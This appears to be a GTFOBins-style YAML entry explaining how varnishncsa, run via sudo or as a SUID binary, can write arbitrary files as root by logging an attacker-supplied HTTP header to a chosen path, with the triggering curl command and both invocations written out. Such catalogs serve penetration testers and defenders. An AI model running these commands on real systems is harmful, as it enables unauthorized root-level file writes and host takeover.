---
description: |
  This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:

  ```
  curl -H 'yyy: DATA' http://localhost:6081/xxx
  ```
functions:
  sudo:
    - code: |
        LFILE=file_to_write
        sudo varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
  suid:
    - code: |
        LFILE=file_to_write
        ./varnishncsa -g request -q 'ReqURL ~ "/xxx"' -F '%{yyy}i' -w "$LFILE"
---
